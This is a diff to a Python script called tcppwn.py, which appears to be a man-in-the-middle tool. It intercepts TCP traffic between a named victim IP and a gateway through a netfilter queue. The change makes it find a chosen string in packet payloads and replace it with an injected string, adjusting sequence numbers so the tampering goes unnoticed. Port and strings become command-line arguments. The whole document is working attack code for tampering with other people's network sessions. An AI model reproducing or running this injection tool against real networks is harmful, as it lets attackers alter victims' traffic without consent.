@@ -95,12 +95,15 @@ def callback(payload):
     global acks
     global first
     global ip1 
-    global ip2 
+    global ip2
+    global string 
+    global newString
+    global port
 
     data = payload.get_data()
     pkt = IP(data)
 
-    if (pkt["TCP"].dport == 9999 or pkt["TCP"].sport == 9999):
+    if (pkt["TCP"].dport == int(port) or pkt["TCP"].sport == int(port)):
         if len(pkt[TCP].payload) == 0:
             print "ACK received\t%s:%s\t---->\t%s:%s\tSeq:\t%s\tAckno.:\t%s\n" % (
                 str(pkt.src),
@@ -178,7 +181,8 @@ def callback(payload):
                         str(pkt.ack),
                         str(pkt["TCP"].payload))       
                     
-                    p = "BLABLABLA\n"
+                    p = str(pkt[TCP].payload)
+                    p = p.replace(string, newString)
                     pkt[TCP].seq += leng1
                     leng = len(p) - len(str(pkt[TCP].payload))
                     leng1 += leng
@@ -240,6 +244,9 @@ def main():
     global leng1
     global ip1 
     global ip2
+    global string 
+    global newString
+    global port
 
     leng1 = 0
     first = True
@@ -247,9 +254,17 @@ def main():
     acks = {}
     sended = False
 
+    if len(sys.argv) != 7:
+        print "[!] Error! Bad arguments.\nUsage: ./tcppwn.py <interface> <victimIP> <gatewayIP> <port> <stringtofind> <stringtoinject>"
+        print "Example: ./tcppwn.py wlan0 192.168.0.2 192.168.0.3 80 FINDME INJECTME"
+        sys.exit(1)
+
     interface = sys.argv[1]
     victimIP = sys.argv[2]
-    gatewayIP = sys.argv[3] 
+    gatewayIP = sys.argv[3]
+    port = sys.argv[4]
+    string = sys.argv[5]
+    newString = sys.argv[6]
 
     try:
         addr = netifaces.ifaddresses(interface)
@@ -266,7 +281,11 @@ def main():
     try:
         socket.inet_aton(gatewayIP)
     except socket.error:
-        print "[!] Error! GatewayIP is not a valid IPv4 address."
+        print "[!] Error! GatewayIP is not a valid IPv4 address. Exiting.."
+        sys.exit(1)
+
+    if int(port) < 1 or int(port) > 65535:
+        print "[!] Error! Port Number is invalid. Exiting.."
         sys.exit(1)
 
     ip1 = victimIP
@@ -294,7 +313,7 @@ def main():
             os.system('iptables -F')
             os.system('iptables -X')
             sys.exit()
-        print "[+] Running Main loop"
+        print "[+] Running Main loop\n"
         q.try_run()
     except KeyboardInterrupt:
         q.unbind(socket.AF_INET)
